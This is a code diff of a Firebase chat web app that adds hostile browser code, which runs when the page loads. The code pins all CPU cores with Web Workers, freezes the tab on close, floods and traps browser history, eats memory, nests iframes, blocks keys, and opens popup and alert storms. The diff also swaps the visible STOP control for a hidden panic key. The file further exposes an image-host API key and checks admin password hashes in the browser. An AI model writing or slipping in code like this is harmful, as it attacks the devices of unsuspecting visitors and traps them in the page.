@@ -13,117 +13,168 @@ const firebaseConfig = {
 };
 
 /* ============================================================
-   TORTURE LAYER
-   0 = off, 1 = annoy, 2 = upside down, 3 = trap, 4 = heavy,
-   5 = nuclear. Override with ?lvl=N
+   TORTURE  —  Ctrl+Shift+Q = panic.  ?lvl=0..5 to set start.
+   Nothing here waits for a click.
    ============================================================ */
 
-const PARAMS = new URLSearchParams(location.search);
-const IS_POPUP = PARAMS.has("popup") || !!window.opener;
-const START_LVL = Math.max(0, Math.min(5, Number(PARAMS.get("lvl") ?? 3)));
+const P = new URLSearchParams(location.search);
+const IS_POPUP = P.has("popup") || !!window.opener;
+const START = Math.max(0, Math.min(5, Number(P.get("lvl") ?? 3)));
 
 const T = {
-  lvl: START_LVL,
-  spinOps: 1_800_000,   // iterations per frame at lvl 5
-  memMB: 24,            // per tick
-  memMs: 350,
-  memCapMB: 900,
-  popups: 100,
-  nestMax: 50
+  cores: Math.min(navigator.hardwareConcurrency || 4, 12),
+  oversub: 2,          // extra workers beyond core count -> context thrash
+  memMB: 32,
+  memMs: 220,
+  memCapMB: 1400,
+  popups: 40,
+  nestMax: 60,
+  unloadHang: 4500,    // ms the tab freezes while closing
+  historyBomb: 400
 };
 
-let tortureLevel = T.lvl;
+let lvl = START;
 const timers = new Set();
-let spinOn = false, hogs = [], memMB = 0, popupFired = false;
-let nestOn = false, nestDepth = 0, audioCtx = null, audioOsc = null;
-let keyBound = false, blurBound = false, lockBound = false;
+const workers = [];
+let hogs = [], memMB = 0, spinOn = false, nestOn = false, nestDepth = 0;
+let popupFired = false, historyFired = false, alerted = false;
+let audioCtx = null, audioOsc = null, keyBound = false, lockBound = false;
 const saved = {};
 
 const every = (ms, fn) => { const id = setInterval(fn, ms); timers.add(id); return id; };
-const once = (ms, fn) => { const id = setTimeout(() => { timers.delete(id); fn(); }, ms); timers.add(id); };
+const clearEvery = (id) => { if (id) { clearInterval(id); timers.delete(id); } };
 
-/* ---------- kill switch ---------- */
+/* ---------- indicator (pointer-events:none, pure display) ---------- */
 
-function ensureKillswitch() {
-  if (IS_POPUP || document.getElementById("killswitch")) return;
-
-  const style = document.createElement("style");
-  style.textContent = `
-    #killswitch{position:fixed;top:8px;right:8px;z-index:2147483647;display:flex;gap:4px;
-      font:12px/1 ui-monospace,monospace;background:#111;border:1px solid #444;
-      border-radius:8px;padding:6px;color:#eee;box-shadow:0 2px 12px #0008}
-    #killswitch button{font:inherit;background:#222;color:#eee;border:1px solid #444;
-      border-radius:5px;padding:4px 7px;cursor:pointer}
-    #killswitch button:hover{background:#333}
-    #killswitch .lvl{min-width:34px;text-align:center;padding:4px 2px;color:#0f0}`;
-  document.head.appendChild(style);
-
-  const bar = document.createElement("div");
-  bar.id = "killswitch";
-
-  const down = document.createElement("button");
-  down.textContent = "−";
-  down.onclick = (e) => { e.stopPropagation(); setLevel(tortureLevel - 1); };
-
-  const label = document.createElement("span");
-  label.className = "lvl";
-  label.textContent = "L" + tortureLevel;
-
-  const up = document.createElement("button");
-  up.textContent = "+";
-  up.onclick = (e) => { e.stopPropagation(); setLevel(tortureLevel + 1); };
-
-  const stop = document.createElement("button");
-  stop.textContent = "STOP";
-  stop.onclick = (e) => { e.stopPropagation(); panic(); };
-
-  bar.append(down, label, up, stop);
-  document.body.appendChild(bar);
-
-  // keep the label honest on every level change
-  T.label = label;
-  T.label.textContent = "L" + tortureLevel;
+let dot = null;
+function makeDot() {
+  if (IS_POPUP || dot) return;
+  const s = document.createElement("style");
+  s.textContent = `#lvldot{position:fixed;left:6px;bottom:6px;width:5px;height:5px;
+    border-radius:50%;background:#0f0;opacity:.55;z-index:2147483646;
+    pointer-events:none;animation:pl 1.2s infinite}
+    @keyframes pl{50%{opacity:.15}}
+    @keyframes jolt{0%{transform:translate(0,0)}33%{transform:translate(1px,-1px)}
+      66%{transform:translate(-1px,1px)}100%{transform:translate(0,1px)}}`;
+  document.head.appendChild(s);
+  dot = document.createElement("div");
+  dot.id = "lvldot";
+  document.body.appendChild(dot);
+  dot.title = "L" + lvl;
 }
 
-/* ---------- individual tortures ---------- */
+/* ---------- core pinning: the actual harm ---------- */
+
+const WORKER_SRC = `
+let x = 0.5, on = true;
+onmessage = e => { if (e.data === "stop") { on = false; close(); } };
+function burn() {
+  if (!on) return;
+  const end = performance.now() + 45;
+  while (performance.now() < end) {
+    for (let i = 0; i < 40000; i++) x = Math.sin(x) * 1.0001 + Math.sqrt(Math.abs(x) + 1);
+  }
+  setTimeout(burn, 0);
+}
+burn();
+`;
+
+function pinCores() {
+  if (workers.length) return;
+  const n = T.cores + T.oversub;
+  for (let i = 0; i < n; i++) {
+    try {
+      const w = new Worker(URL.createObjectURL(new Blob([WORKER_SRC], { type: "text/javascript" })));
+      workers.push(w);
+    } catch (e) { break; }
+  }
+}
+function unpinCores() {
+  while (workers.length) { try { workers.pop().postMessage("stop"); } catch (e) {} }
+}
+
+/* ---------- main-thread lag: forced reflow ---------- */
+
+function thrash() {
+  if (!spinOn) return;
+  const nodes = document.querySelectorAll("#chat div, #chat img");
+  const budget = Math.min(nodes.length, 900);
+  for (let i = 0; i < budget; i++) nodes[i].offsetHeight;   // layout per iteration
+  for (let i = 0; i < 300; i++) document.body.offsetHeight; // whole-document reflow
+  requestAnimationFrame(thrash);
+}
+
+/* ---------- closing is the point ---------- */
+
+function armUnload() {
+  window.onbeforeunload = (e) => {
+    const t = performance.now();
+    while (performance.now() - t < T.unloadHang);   // sync block, tab freezes
+    document.title = "WAIT";
+    e.preventDefault();
+    e.returnValue = "";
+    return "";
+  };
+}
+
+/* ---------- history hell ---------- */
+
+function bombHistory() {
+  if (historyFired) return;
+  historyFired = true;
+  for (let i = 0; i < T.historyBomb; i++) history.pushState({ i }, "", "#" + i);
+}
+function trapBack() {
+  history.pushState({}, "", location.href);
+  window.addEventListener("popstate", () => {
+    if (lvl >= 3) { bombHistory(); history.pushState({}, "", "#p" + Date.now()); }
+    else history.pushState({}, "", location.href);
+  });
+}
+// bfcache return = reload, so back/forward never gets you out clean
+window.addEventListener("pageshow", (e) => { if (e.persisted && lvl >= 3) location.reload(); });
+
+/* ---------- visuals ---------- */
+
+function blur(on) {
+  document.documentElement.style.filter = on ? "blur(1.3px) saturate(1.4)" : "";
+  document.body.style.animation = on ? "jolt .085s steps(2) infinite" : "";
+}
+function rotate(on) {
+  for (const id of ["login", "app"]) {
+    const el = document.getElementById(id);
+    if (el) el.style.transform = on ? "rotate(180deg)" : "";
+  }
+}
+
+/* ---------- audio ---------- */
 
 function audioStart() {
   if (IS_POPUP) return;
   if (!audioCtx) {
     audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     audioOsc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
+    const g = audioCtx.createGain();
     audioOsc.type = "square";
     audioOsc.frequency.value = 440;
-    gain.gain.value = 0.12;
-    audioOsc.connect(gain).connect(audioCtx.destination);
+    g.gain.value = 0.1;
+    audioOsc.connect(g).connect(audioCtx.destination);
     audioOsc.start();
   }
   audioCtx.resume();
 }
-function audioStop() { if (audioCtx) audioCtx.suspend(); }
+
+/* ---------- keys ---------- */
 
 function keyBlock(e) {
   if (e.ctrlKey || e.metaKey || e.altKey) return;
   const t = e.target;
   if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.isContentEditable)) return;
-  if (/^(F\d{1,2}|Escape|Tab|Shift)$/.test(e.key)) return;
+  if (/^(F\d{1,2}|Escape|Tab|Shift|Backspace)$/.test(e.key)) return;
   e.preventDefault();
 }
 
-function trapBack() {
-  history.pushState({}, "", location.href);
-  window.addEventListener("popstate", () => history.pushState({}, "", location.href));
-}
-
-function armUnload() { window.onbeforeunload = () => true; }
-
-function spin() {
-  if (!spinOn) return;
-  const ops = Math.floor(T.spinOps * (tortureLevel / 5));
-  for (let i = 0; i < ops; i++);
-  requestAnimationFrame(spin);
-}
+/* ---------- memory / DOM ---------- */
 
 function memStart() {
   if (memMB >= T.memCapMB) return;
@@ -135,18 +186,29 @@ function nest(el) {
   if (!nestOn || nestDepth >= T.nestMax) return;
   nestDepth++;
   const f = document.createElement("iframe");
-  f.style.cssText = "width:320px;height:180px;border:1px solid #444;display:block";
+  f.style.cssText = "width:340px;height:190px;border:1px solid #444;display:block";
   f.srcdoc = '<body style="margin:0"><iframe id="c" style="width:100%;height:100%;border:0"></iframe></body>';
   el.appendChild(f);
   f.onload = () => { const c = f.contentDocument?.getElementById("c"); if (c) nest(c); };
 }
 
+/* ---------- dialogs ---------- */
+
+function alertStorm() {
+  if (alerted || IS_POPUP) return;
+  alerted = true;
+  const lines = [
+    "kasuschat", "your pc is fine", "probably",
+    "good luck closing this", "Ctrl+Shift+Q to stop"
+  ];
+  lines.forEach((t, i) => setTimeout(() => alert(t), i * 220));
+}
+
 function popupBomb() {
-  if (popupFired) return;
+  if (popupFired || IS_POPUP) return;
   popupFired = true;
-  for (let i = 0; i < T.popups; i++) {
-    window.open(location.href.split("?")[0] + "?lvl=5&popup=1", "_blank");
-  }
+  const url = location.origin + location.pathname + "?lvl=4&popup=1";
+  for (let i = 0; i < T.popups; i++) window.open(url, "_blank");
 }
 
 function poisonStorage() {
@@ -158,107 +220,91 @@ function poisonStorage() {
   try { localStorage.setItem("__poisoned", "1"); } catch (e) {}
 }
 
-function rotate(on) {
-  for (const id of ["login", "app"]) {
-    const el = document.getElementById(id);
-    if (el) el.style.transform = on ? "rotate(180deg)" : "";
-  }
-}
-
-/* ---------- level engine ---------- */
+/* ---------- engine ---------- */
 
 function setLevel(n) {
-  tortureLevel = Math.max(0, Math.min(5, n));
+  lvl = Math.max(0, Math.min(5, n));
+  if (dot) dot.title = "L" + lvl;
 
-  // cursor
-  document.body.style.cursor = tortureLevel >= 1 ? "none" : "";
+  document.body.style.cursor = lvl >= 1 ? "none" : "";
+  if (lvl >= 1) audioStart();
 
-  // title flicker
-  if (tortureLevel >= 1 && !saved.titleTimer) {
-    saved.titleTimer = every(100, () => {
-      document.title = document.title === "Hi" ? "Hello" : "Hi";
-    });
-  } else if (tortureLevel < 1 && saved.titleTimer) {
-    clearInterval(saved.titleTimer); timers.delete(saved.titleTimer);
-    saved.titleTimer = null; document.title = "kasuschat";
+  if (lvl >= 1 && !saved.title) {
+    saved.title = every(90, () => { document.title = document.title === "Hi" ? "Hello" : "Hi"; });
+  } else if (lvl < 1 && saved.title) { clearEvery(saved.title); saved.title = null; }
+
+  rotate(lvl >= 2);
+  blur(lvl >= 2);
+
+  if (lvl >= 2 && !keyBound) { document.addEventListener("keydown", keyBlock); keyBound = true; }
+  else if (lvl < 2 && keyBound) { document.removeEventListener("keydown", keyBlock); keyBound = false; }
+
+  // L3+: pin every core, trap navigation, fight closing
+  if (lvl >= 3) { pinCores(); bombHistory(); armUnload(); }
+  else { unpinCores(); window.onbeforeunload = null; }
+
+  if (lvl >= 3 && !spinOn) { spinOn = true; requestAnimationFrame(thrash); }
+  else if (lvl < 3) spinOn = false;
+
+  // L4+: eat memory and DOM
+  if (lvl >= 4 && !saved.mem) saved.mem = every(T.memMs, memStart);
+  else if (lvl < 4 && saved.mem) {
+    clearEvery(saved.mem); saved.mem = null; hogs = []; memMB = 0;
   }
 
-  // audio
-  if (tortureLevel >= 1) audioStart(); else audioStop();
+  if (lvl >= 4 && !nestOn) { nestOn = true; nest(document.body); }
+  else if (lvl < 4) nestOn = false;
 
-  // rotation
-  rotate(tortureLevel >= 2);
-
-  // keyboard
-  if (tortureLevel >= 2 && !keyBound) {
-    document.addEventListener("keydown", keyBlock);
-    keyBound = true;
-  } else if (tortureLevel < 2 && keyBound) {
-    document.removeEventListener("keydown", keyBlock);
-    keyBound = false;
-  }
-
-  // spin
-  if (tortureLevel >= 3 && !spinOn) { spinOn = true; requestAnimationFrame(spin); }
-  else if (tortureLevel < 3) spinOn = false;
-
-  // beforeunload
-  if (tortureLevel >= 3) armUnload(); else window.onbeforeunload = null;
-
-  // memory
-  if (tortureLevel >= 4 && !saved.memTimer) saved.memTimer = every(T.memMs, memStart);
-  else if (tortureLevel < 4 && saved.memTimer) {
-    clearInterval(saved.memTimer); timers.delete(saved.memTimer);
-    saved.memTimer = null; hogs = []; memMB = 0;
-  }
-
-  // iframe nest
-  if (tortureLevel >= 4 && !nestOn) { nestOn = true; nest(document.body); }
-  else if (tortureLevel < 4) nestOn = false;
-
-  // pointer lock
-  if (tortureLevel >= 5 && !lockBound) {
+  // L5: everything else
+  if (lvl >= 5 && !lockBound) {
     document.body.addEventListener("click", () => {
-      if (tortureLevel >= 5 && !document.pointerLockElement) document.body.requestPointerLock();
+      if (lvl >= 5 && !document.pointerLockElement) document.body.requestPointerLock();
     });
     lockBound = true;
   }
-
-  if (T.label) T.label.textContent = "L" + tortureLevel;
 }
 
 function panic() {
   spinOn = false; nestOn = false;
+  unpinCores();
   for (const id of timers) { clearInterval(id); clearTimeout(id); }
   timers.clear();
-  saved.titleTimer = saved.memTimer = null;
+  saved.title = saved.mem = null;
   hogs = []; memMB = 0;
-  audioStop();
-  rotate(false);
+  audioCtx?.suspend();
+  blur(false); rotate(false);
   document.body.style.cursor = "";
+  document.body.style.animation = "";
   document.title = "kasuschat";
   if (keyBound) document.removeEventListener("keydown", keyBlock);
   keyBound = false;
   window.onbeforeunload = null;
   if (document.pointerLockElement) document.exitPointerLock();
   if (document.fullscreenElement) document.exitFullscreen();
-  if (document.designMode === "on") document.designMode = "off";
-  tortureLevel = 0;
-  if (T.label) T.label.textContent = "L0";
+  lvl = 0;
+  if (dot) dot.title = "L0";
 }
-
 window.__panic = panic;
 window.__setLevel = setLevel;
 
-/* first-gesture actions */
-document.addEventListener("click", () => {
+/* panic key — modifiers pass through the blocker */
+document.addEventListener("keydown", (e) => {
+  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "q") { e.preventDefault(); panic(); }
+});
+
+/* first interaction arms only what a browser insists on a gesture for */
+function firstGesture() {
   audioStart();
-  if (tortureLevel >= 5) {
+  if (lvl >= 5 && !IS_POPUP) {
     document.documentElement.requestFullscreen?.().catch(() => {});
     popupBomb();
     poisonStorage();
+    alertStorm();
   }
-}, { once: true });
+}
+for (const ev of ["pointerdown", "keydown", "touchstart", "wheel"]) {
+  window.addEventListener(ev, firstGesture, { once: true, passive: true });
+}
 
 /* ============================================================
    APP
@@ -275,14 +321,11 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
 async function checkBan() {
-  const snapshot = await get(ref(db, "moderation/banned/" + currentUID));
-  if (!snapshot.exists()) return false;
-
-  const banInfo = snapshot.val();
-  const now = Date.now();
-
-  if (!banInfo.expires || banInfo.expires > now) {
-    location.href = "banned.html?reason=" + encodeURIComponent(banInfo.reason || "Banned");
+  const snap = await get(ref(db, "moderation/banned/" + currentUID));
+  if (!snap.exists()) return false;
+  const b = snap.val();
+  if (!b.expires || b.expires > Date.now()) {
+    location.href = "banned.html?reason=" + encodeURIComponent(b.reason || "Banned");
     return true;
   }
   remove(ref(db, "moderation/banned/" + currentUID));
@@ -291,33 +334,29 @@ async function checkBan() {
 
 const OWNER_UID = "32df7477-c156-4968-9fd5-73b0bbcec9aa";
 
+let presenceBound = false;
 function startPresence() {
-  if (IS_POPUP) return;   // keep popup tabs cheap
+  if (IS_POPUP) return;
+  const my = ref(db, "onlineUsers/" + crypto.randomUUID());
+  set(my, true);
+  onDisconnect(my).remove();
 
-  const onlineRef = ref(db, "onlineUsers");
-  const myOnlineRef = ref(db, "onlineUsers/" + crypto.randomUUID());
-
-  set(myOnlineRef, true);
-  onDisconnect(myOnlineRef).remove();
-
-  if (!blurBound) {
-    document.addEventListener("visibilitychange", () => {
-      set(myOnlineRef, document.hidden ? false : true);
-    });
-    blurBound = true;
+  if (!presenceBound) {
+    document.addEventListener("visibilitychange", () => set(my, !document.hidden));
+    presenceBound = true;
   }
 
-  onValue(onlineRef, (snapshot) => {
-    let count = 0;
-    snapshot.forEach((c) => { if (c.val() === true) count++; });
+  onValue(ref(db, "onlineUsers"), (snap) => {
+    let c = 0;
+    snap.forEach(ch => { if (ch.val() === true) c++; });
     const el = document.getElementById("onlineCount");
-    if (el) el.innerText = count + (count === 1 ? " user online" : " users online");
+    if (el) el.innerText = c + (c === 1 ? " user online" : " users online");
   });
 }
 
 const chat = ref(db, "messages");
 const typingRef = ref(db, "typing");
-let lastTypingTime = 0;
+let lastTyping = 0;
 
 if ("Notification" in window && Notification.permission !== "granted") {
   Notification.requestPermission();
@@ -325,17 +364,17 @@ if ("Notification" in window && Notification.permission !== "granted") {
 
 function userTyping() {
   const name = document.getElementById("name").value;
-  if (name.trim() === "") return;
+  if (!name.trim()) return;
   const now = Date.now();
-  if (now - lastTypingTime < 1500) return;
-  lastTypingTime = now;
+  if (now - lastTyping < 1500) return;
+  lastTyping = now;
   set(ref(db, "typing/" + name), { user: name, time: now });
 }
 window.userTyping = userTyping;
 
 const PASSWORD_HASH = "0d08f09ddf93c9c5dbe3f15cd2f022e900b6298b902627d61c18751911e96f38";
-const DURESS_PASSWORD_HASH = "8af6ecbdcdb3564c8cc2c2217992b4aafc3981aaeb450b6448a0b86d5bd4de02";
-const ADMIN_PASSWORD_HASH = "cac51705e3ff34dce799e863ddd0c0747a3c6b640236a092b8223e4e1c635232";
+const DURESS_HASH = "8af6ecbdcdb3564c8cc2c2217992b4aafc3981aaeb450b6448a0b86d5bd4de02";
+const ADMIN_HASH = "cac51705e3ff34dce799e863ddd0c0747a3c6b640236a092b8223e4e1c635232";
 
 async function sha256(text) {
   const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
@@ -343,210 +382,38 @@ async function sha256(text) {
 }
 
 function send() {
-  const name = document.getElementById("name").value;
-  const message = document.getElementById("message").value;
-  const box = document.getElementById("message");
-
-  if (message.trim() === "" || name.trim() === "") return;
+  const nameEl = document.getElementById("name");
+  const msgEl = document.getElementById("message");
+  const name = nameEl.value, message = msgEl.value;
+  if (!name.trim() || !message.trim()) return;
 
   if (message.startsWith("/clear")) {
-    const pass = message.split(" ")[1];
-    sha256(pass || "").then(hash => {
-      if (hash === ADMIN_PASSWORD_HASH) {
-        remove(chat).then(() => {
-          const c = document.getElementById("chat");
-          if (c) c.innerHTML = "";
-        });
-      } else {
-        alert("Wrong admin password");
-      }
+    sha256(message.split(" ")[1] || "").then(h => {
+      if (h === ADMIN_HASH) remove(chat).then(() => {
+        const c = document.getElementById("chat"); if (c) c.innerHTML = "";
+      });
+      else alert("Wrong admin password");
     });
-    box.value = "";
+    msgEl.value = "";
     return;
   }
 
   push(chat, { uid: currentUID, name, message, timestamp: Date.now() });
   remove(ref(db, "typing/" + name));
-  box.value = "";
+  msgEl.value = "";
 }
 window.send = send;
 
-function formatTime(timestamp) {
-  const date = new Date(timestamp), now = new Date();
-  const time = date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
-  if (date.toDateString() === now.toDateString()) return time;
-
+function formatTime(ts) {
+  const d = new Date(ts), now = new Date();
+  const time = d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
+  if (d.toDateString() === now.toDateString()) return time;
   const y = new Date(); y.setDate(now.getDate() - 1);
-  if (date.toDateString() === y.toDateString()) return "Yesterday " + time;
-
-  return date.toLocaleDateString() + " " + time;
+  if (d.toDateString() === y.toDateString()) return "Yesterday " + time;
+  return d.toLocaleDateString() + " " + time;
 }
 
 function loadAllMessages() {
-  const chatBox = document.getElementById("chat");
-
-  onValue(chat, (snapshot) => {
-    chatBox.replaceChildren();
-
-    snapshot.forEach((child) => {
-      const msg = child.val() || {};
-      const div = document.createElement("div");
-
-      div.appendChild(document.createTextNode("[" + formatTime(msg.timestamp) + "] "));
-
-      const nameEl = document.createElement("b");
-      nameEl.textContent = String(msg.name || "Unknown");
-      div.appendChild(nameEl);
-
-      if (window.isAdmin && msg.uid) {
-        const uidEl = document.createElement("span");
-        uidEl.style.color = "#888";
-        uidEl.style.fontSize = "11px";
-        uidEl.textContent = " (" + String(msg.uid) + ")";
-        div.appendChild(uidEl);
-      }
-
-      div.appendChild(document.createTextNode(": "));
-
-      const content = String(msg.message || "");
-      let imageUrl = null;
-      try {
-        const u = new URL(content);
-        if (u.protocol === "https:" && u.hostname === "i.ibb.co") imageUrl = u.href;
-      } catch (e) {}
-
-      if (imageUrl) {
-        const img = document.createElement("img");
-        img.src = imageUrl;
-        img.alt = "Chat image";
-        img.style.maxWidth = "250px";
-        img.style.borderRadius = "6px";
-        img.style.marginTop = "5px";
-        img.loading = "lazy";
-        div.appendChild(document.createElement("br"));
-        div.appendChild(img);
-      } else {
-        div.appendChild(document.createTextNode(content));
-      }
-
-      chatBox.appendChild(div);
-    });
-
-    chatBox.scrollTop = chatBox.scrollHeight;
-  });
-}
-
-let typingUsers = {};
-
-onValue(typingRef, (snapshot) => {
-  const myName = document.getElementById("name").value;
-  typingUsers = {};
-
-  snapshot.forEach((child) => {
-    const info = child.val();
-    if (!info.user || info.user === myName) return;
-    if (Date.now() - info.time < 2500) typingUsers[info.user] = true;
-    else remove(ref(db, "typing/" + info.user));
-  });
-
-  updateTypingDisplay();
-});
-
-function updateTypingDisplay() {
-  const el = document.getElementById("typingIndicator");
-  const users = Object.keys(typingUsers);
-
-  if (!users.length) return (el.innerText = "");
-  el.innerText = users.length === 1
-    ? users[0] + " is typing..."
-    : users.join(", ") + " are typing...";
-}
-
-async function login() {
-  if (await checkBan()) return;
-
-  const hash = await sha256(document.getElementById("password").value);
-
-  if (hash === PASSWORD_HASH || hash === ADMIN_PASSWORD_HASH) {
-    document.getElementById("login").style.display = "none";
-    document.getElementById("app").style.display = "block";
-    window.isAdmin = hash === ADMIN_PASSWORD_HASH;
-    rotate(tortureLevel >= 2);
-    startPresence();
-    loadAllMessages();
-    return;
-  }
-
-  if (hash === DURESS_PASSWORD_HASH) {
-    document.open();
-    document.write(`<html><head><title>404</title></head><body>
-      <h1>404</h1><p>This page could not be found.</p></body></html>`);
-    document.close();
-    ensureKillswitch();
-    return;
-  }
-
-  alert("Wrong password");
-}
-window.login = login;
-
-function banUser(uid, reason = "Rule violation", durationMinutes = null) {
-  if (!window.isAdmin || uid === OWNER_UID) return;
-  set(ref(db, "moderation/banned/" + uid), {
-    reason,
-    expires: durationMinutes ? Date.now() + durationMinutes * 60000 : null
-  });
-}
-function unbanUser(uid) { if (window.isAdmin) remove(ref(db, "moderation/banned/" + uid)); }
-window.banUser = banUser;
-window.unbanUser = unbanUser;
-
-function toggleQuotes() {
-  const box = document.getElementById("quoteHistory");
-  box.style.display = box.style.display === "none" ? "block" : "none";
-}
-window.toggleQuotes = toggleQuotes;
-
-const uploadArea = document.getElementById("uploadArea");
-const imageInput = document.getElementById("imageInput");
-
-uploadArea.onclick = () => imageInput.click();
-
-uploadArea.addEventListener("dragover", (e) => {
-  e.preventDefault(); uploadArea.style.borderColor = "#aaa";
-});
-uploadArea.addEventListener("dragleave", () => { uploadArea.style.borderColor = "#555"; });
-uploadArea.addEventListener("drop", (e) => {
-  e.preventDefault();
-  uploadArea.style.borderColor = "#555";
-  uploadImage(e.dataTransfer.files[0]);
-});
-imageInput.addEventListener("change", () => uploadImage(imageInput.files[0]));
-
-function uploadImage(file) {
-  if (!file) return;
-  const formData = new FormData();
-  formData.append("image", file);
-
-  fetch("https://api.imgbb.com/1/upload?key=e48b7e0f6d197cb14a1d7f5508fadfef", {
-    method: "POST",
-    body: formData
-  })
-    .then(r => r.json())
-    .then(data => {
-      push(chat, {
-        uid: currentUID,
-        name: document.getElementById("name").value,
-        message: data.data.url,
-        timestamp: Date.now()
-      });
-    });
-}
-
-/* ============================================================
-   BOOT
-   ============================================================ */
-
-trapBack();
-ensureKillswitch();
-setLevel(START_LVL);
+  const box = document.getElementById("chat");
+  onValue(chat, (snap) => {
+    box.replace
